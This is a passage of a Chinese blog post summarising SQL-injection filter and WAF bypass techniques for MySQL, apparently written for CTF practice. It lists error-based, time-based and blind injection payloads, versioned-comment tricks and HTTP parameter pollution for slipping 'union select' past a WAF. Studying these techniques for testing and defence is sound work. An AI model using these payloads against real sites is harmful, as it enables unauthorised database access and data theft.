+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>payload：<code>(extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p>
+<h4 id="rand-group-count"><a href="#rand-group-count" class="headerlink" title="rand()+group()+count()"></a>rand()+group()+count()</h4><p>payload：<code>select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p>
+<h4 id="GeometryCollection"><a href="#GeometryCollection" class="headerlink" title="GeometryCollection"></a>GeometryCollection</h4><p>payload：<code>GeometryCollection((select * from (select* from(select user())a)b))</code></p>
+<h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon"></a>polygon</h4><p>payload：<code>polygon((select * from(select * from(select user())a)b))</code></p>
+<h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint"></a>multipoint</h4><p>payload：<code>multipoint((select * from(select * from(select user())a)b))</code></p>
+<h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring"></a>multilinestring</h4><p>payload：<code>multilinestring((select * from(select * from(select user())a)b))</code></p>
+<h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring"></a>linestring</h4><p>payload：<code>LINESTRING((select * from(select * from(select user())a)b))</code></p>
+<h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon"></a>multipolygon</h4><p>payload：<code>multipolygon((select * from(select * from(select user())a)b))</code></p>
+<h3 id="函数时延"><a href="#函数时延" class="headerlink" title="函数时延"></a>函数时延</h3><h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h4><p>payload:<code>select 1,3 and sleep(1)</code></p>
+<h4 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h4><p> MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。<br>参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式.</p>
+<p><code>benchmark(time,fun)</code></p>
+<h3 id="字符串截取替代"><a href="#字符串截取替代" class="headerlink" title="字符串截取替代"></a>字符串截取替代</h3><h4 id="SUBSTR"><a href="#SUBSTR" class="headerlink" title="SUBSTR"></a>SUBSTR</h4><p>substr（data，statr，len）</p>
+<p><img src="image-20210201184708338.png" alt="image-20210201184708338"></p>
+<h4 id="SUBSTRING"><a href="#SUBSTRING" class="headerlink" title="SUBSTRING"></a>SUBSTRING</h4><p>substring（data，statr，len）</p>
+<p><img src="image-20210201184758057.png" alt="image-20210201184758057"></p>
+<p>还有多种模式：<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)。</code></p>
+<h4 id="RIGHT"><a href="#RIGHT" class="headerlink" title="RIGHT"></a>RIGHT</h4><p>RIGHT(str,len)，对指定字符串从最右边截取指定长度。</p>
+<p><img src="image-20210201190835425.png" alt="image-20210201190835425"></p>
+<h4 id="LEFT"><a href="#LEFT" class="headerlink" title="LEFT"></a>LEFT</h4><p>LEFT(str,len)，对指定字符串从最左边截取指定长度。</p>
+<p><img src="image-20210201190937713.png" alt="image-20210201190937713"></p>
+<h4 id="RPAD"><a href="#RPAD" class="headerlink" title="RPAD"></a>RPAD</h4><p>RPAD(str,len,padstr)，在 str 右方补齐 len 位的字符串 padstr，返回新字符串。如果 str 长度大于 len，则返回值的长度将缩减到 len 所指定的长度。</p>
+<p><img src="image-20210201191659765.png" alt="image-20210201191659765"></p>
+<h4 id="LPAD"><a href="#LPAD" class="headerlink" title="LPAD"></a>LPAD</h4><p>LPAD(str,len,padstr)，与RPAD相似，在str左边补齐。</p>
+<p><img src="image-20210201191809029.png" alt="image-20210201191809029"></p>
+<h4 id="MID"><a href="#MID" class="headerlink" title="MID"></a>MID</h4><p>mid(str,pos,len)同于 SUBSTRING。</p>
+<p><img src="image-20210201192553328.png" alt="image-20210201192553328"></p>
+<h4 id="CONCAT"><a href="#CONCAT" class="headerlink" title="CONCAT"></a>CONCAT</h4><p>concat(str1,str2…)，函数用于将多个字符串合并为一个字符串。</p>
+<h4 id="GROUP-CONCAT"><a href="#GROUP-CONCAT" class="headerlink" title="GROUP_CONCAT"></a>GROUP_CONCAT</h4><p>返回一个字符串结果，该结果由分组中的值连接组合而成。</p>
+<h4 id="MAKE-SET"><a href="#MAKE-SET" class="headerlink" title="MAKE_SET"></a>MAKE_SET</h4><p>MAKE_SET(bits,str1,str2,…)根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code>。</p>
+<h2 id="其他特性"><a href="#其他特性" class="headerlink" title="其他特性"></a>其他特性</h2><h3 id="注释逃逸"><a href="#注释逃逸" class="headerlink" title="注释逃逸"></a>注释逃逸</h3><p><code>/* */</code> 在mysql中是多行注释,但是如果里面加了! 那么后面的内容会被执行.</p>
+<p>正常的sql语句:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">NAME</span> <span class="keyword">FROM</span> books <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">DATABASE</span>();</span><br></pre></td></tr></table></figure>
+
+<p>效果如下:<img src="image-20210131195902194.png" alt="image-20210131195902194"></p>
+<p>含有<code>/*! */</code>的sql语句;</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">NAME</span> <span class="keyword">FROM</span> books <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="comment">/*!union*/</span> <span class="keyword">SELECT</span> <span class="keyword">DATABASE</span>();</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210131200812789.png" alt="image-20210131200812789"></p>
+<p>我们还可以利用一个<code>*/</code>去匹配多个<code>/*！</code>，例如sql语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">NAME</span> <span class="keyword">FROM</span> books <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="comment">/*!union/*!select*/</span><span class="keyword">DATABASE</span>();</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210131195818399.png" alt="image-20210131195818399"></p>
+<h3 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h3><p> 在与服务器进行交互的过程中，客户端往往会在GET/POST请求中带上参数。通常在一个请求中，同名参数只会出现一次，但是在HTTP协议中是允许同名参数多次出现的。</p>
+<p><img src="image-20210201201149269.png" alt="image-20210201201149269"></p>
+<p>如果一个网站只在tomcat服务器处做数据过滤和处理，我们可以利用解析参数的不同，对WAF检测进行绕过。</p>
+<p>攻击payload：<code>index.php?id=-1&#39; union select 1,database(),3--+</code></p>
+<p>union select…会被tomcat服务器识别为恶意攻击并拦截，而如果payload如下：</p>
+<p>攻击payload：<code>index.php?id=1&amp;id=-1&#39; union select 1,database(),3--+</code></p>
+<p>tomcat服务器检测第一个参数后发现无异常，提交给apache服务器。成功绕过WAF拦截</p>
+<h2 id="handler语句代替select查询"><a href="#handler语句代替select查询" class="headerlink" title="handler语句代替select查询"></a>handler语句代替select查询</h2><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p>
+<p>语法:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] <span class="keyword">alias</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> | PREV | <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure>
+
+<p>例如,查询一个表名为 books的表:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span>  books <span class="keyword">open</span> <span class="keyword">as</span> x; <span class="comment">#指定数据表进行载入并将返回句柄重命名</span></span><br><span class="line"><span class="keyword">handler</span> x <span class="keyword">read</span> <span class="keyword">first</span>; <span class="comment">#读取指定表/句柄的首行数据</span></span><br><span class="line"><span class="keyword">handler</span> x <span class="keyword">read</span> <span class="keyword">next</span>; <span class="comment">#读取指定表/句柄的下一行数据</span></span><br><span class="line"><span class="keyword">handler</span> x <span class="keyword">read</span> <span class="keyword">next</span>; <span class="comment">#读取指定表/句柄的下一行数据</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">handler</span> x <span class="keyword">close</span>; <span class="comment">#关闭句柄</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210201173229186.png" alt="image-20210201173229186"></p>
+<h3 id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@@VERSION <span class="comment">#返回版本信息</span></span><br><span class="line">@@GLOBAL.VERSION <span class="comment">#返回版本信息</span></span><br><span class="line">@@HOSTNAME	 <span class="comment">#返回安装的计算机名称</span></span><br><span class="line">@@BASEDIR    <span class="comment">#	返回MYSQL绝对路径	</span></span><br><span class="line">@@datadir    <span class="comment">#  返回MYSQL数据保存绝对路径	</span></span><br><span class="line">database()   <span class="comment">#当前数据库信息</span></span><br><span class="line">user()       <span class="comment">#当前用户信息</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.secpulse.com/archives/68991.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/68991.html</a></p>
+<p><a href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/">关于sql注入bypass总结</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
+        <p><span>发布时间:</span>2021-01-31, 18:51:08</p>
+        <p><span>最后更新:</span>2021-02-01, 20:22:21</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/" title="关于sql注入bypass总结">lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">
+                    网鼎杯 2018-Comment  复现笔记
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/">
+                    安洵杯2019复现
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#中间件过滤绕过"><span class="toc-text">中间件过滤绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法替换绕过"><span class="toc-text">方法替换绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#空格绕过"><span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注释符绕过"><span class="toc-text">注释符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数字与大写字母绕过"><span class="toc-text">数字与大写字母绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#等号绕过"><span class="toc-text">等号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#逗号绕过"><span class="toc-text">逗号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#大于小于符号绕过"><span class="toc-text">大于小于符号绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#greatest-amp-amp-least"><span class="toc-text">greatest&amp;&amp;least</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strcmp"><span class="toc-text">strcmp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#in关键字"><span class="toc-text">in关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#between-a-and-b"><span class="toc-text">between a and b</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#逻辑符号与关键词替代绕过"><span class="toc-text">逻辑符号与关键词替代绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#引号绕过"><span class="toc-text">引号绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用十六进制"><span class="toc-text">使用十六进制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#用宽字节绕过"><span class="toc-text">用宽字节绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep绕过"><span class="toc-text">sleep绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入函数替代"><span class="toc-text">报错注入函数替代</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rand-group-count"><span class="toc-text">rand()+group()+count()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GeometryCollection"><span class="toc-text">GeometryCollection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#polygon"><span class="toc-text">polygon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multipoint"><span class="toc-text">multipoint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multilinestring"><span class="toc-text">multilinestring</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linestring"><span class="toc-text">linestring</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multipolygon"><span class="toc-text">multipolygon</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#函数时延"><span class="toc-text">函数时延</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-text">sleep</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#benchmark"><span class="toc-text">benchmark</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符串截取替代"><span class="toc-text">字符串截取替代</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SUBSTR"><span class="toc-text">SUBSTR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SUBSTRING"><span class="toc-text">SUBSTRING</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RIGHT"><span class="toc-text">RIGHT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LEFT"><span class="toc-text">LEFT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RPAD"><span class="toc-text">RPAD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LPAD"><span class="toc-text">LPAD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MID"><span class="toc-text">MID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CONCAT"><span class="toc-text">CONCAT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GROUP-CONCAT"><span class="toc-text">GROUP_CONCAT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MAKE-SET"><span class="toc-text">MAKE_SET</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他特性"><span class="toc-text">其他特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#注释逃逸"><span class="toc-text">注释逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http参数污染"><span class="toc-text">http参数污染</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#handler语句代替select查询"><span class="toc-text">handler语句代替select查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常见全局变量"><span class="toc-text">常见全局变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"关于sql注入bypass总结　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" title="上一篇: 网鼎杯 2018-Comment  复现笔记">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/" title="下一篇: 安洵杯2019复现">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/">解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/">Hunting— HTB  PWN  challenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/">xman的leve5另一种解法(mprotect)学习与利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/">ctfshow-月饼杯2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/16/'could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!'%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/">\`could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!\`报错缓解方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/">5种字符'(^.9)'构造php_shellcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/17/ractf2021-pwn-ctf/">ractf2021-pwn-ctf</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/28/imaginaryctf2021--pwn-wp/">imaginaryctf2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">高版本libc(2.29-2.32) off by null利用姿势笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/26/2021qwb%20pwn%20wp/">2021qwb-pwn-初赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/28/ISCC2021%20PWN%20WP/">ISCC2021 PWN部分 WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/">ret2dl-resolve利用方法小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">系统调用与SROP方法学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/">pwn堆题泄露libc真实地址小tirck</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/28/CTF%202021%20PWN%20babyheap%20%20%E5%A4%8D%E7%8E%B0%E8%AE%B0/">2021*CTF_PWN_babyheap复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(9)/">关于格式化字符串利用——学pwn小记(9)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/17/Tcache%20attack%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(8)/">Tcache attack初学习——学pwn小记(8)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/">从对b00k题目学习中初习off-by-one——学pwn小记(7)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/08/actf--wp/">ångstromCTF 2021--wp与复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/">修改ELF文件libc为指定版本</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数——学pwn小记(6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/">fastbin二次释放——学pwn小记(5)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">网鼎杯 2018-Comment  复现笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/">关于sql注入bypass总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/">安洵杯2019复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">xman pwn题复现——学pwn小记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/">flask.request的内置属性总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/">对php伪协议的归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/21/HWCTF-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BAWP/">HWCTF-华为云场WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/16/linux%20%E5%86%85%E7%BD%AE%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/">linux 内置参数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/">关于jinja2特性对ssti的bypass的影响</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/16/%E5%85%B3%E4%BA%8Ephp%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/">php执行与文件系统处理函数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/">第五届上海市大学生网络安全大赛-初赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/12/ctf-show_%E5%8E%9F%E8%B0%85%E6%9D%AFwp/">ctf-show_原谅杯wp</a></li><li 